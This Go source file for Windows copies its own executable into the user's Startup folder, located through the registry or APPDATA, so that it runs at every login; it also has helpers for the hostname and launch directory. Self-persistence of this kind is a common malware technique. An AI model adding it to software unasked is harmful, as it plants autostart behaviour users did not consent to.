package main

import (
	"golang.org/x/sys/windows/registry"
	"io"
	"os"
	"path/filepath"
)

func copyToStartup() bool {
	exePath, err := os.Executable()
	if err != nil {
		return false
	}

	startupDir := getStartupDir()
	if startupDir == "" {
		return false
	}

	destPath := filepath.Join(startupDir, filepath.Base(exePath))
	err = os.MkdirAll(filepath.Dir(destPath), 0755)
	if err != nil {
		return false
	}

	destFile, err := os.Create(destPath)
	if err != nil {
		return false
	}
	defer destFile.Close()

	srcFile, err := os.Open(exePath)
	if err != nil {
		return false
	}
	defer srcFile.Close()

	_, err = io.Copy(destFile, srcFile)
	return err == nil
}

func getStartupDir() string {
	var startupDir string
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`, registry.QUERY_VALUE)
	if err == nil {
		startupDir, _, err = k.GetStringValue("Startup")
		k.Close()
		if err != nil {
			return ""
		}
	} else {
		startupDir = filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	}
	return startupDir
}

func getLaunchDir() string {
	if len(os.Args) > 1 {
		return os.Args[1]
	}
	wd, err := os.Getwd()
	if err != nil {
		return ""
	}
	return wd
}

func getHostName() string {
	hostname, err := os.Hostname()
	if err != nil {
		return getLaunchDir()
	}
	return hostname
}
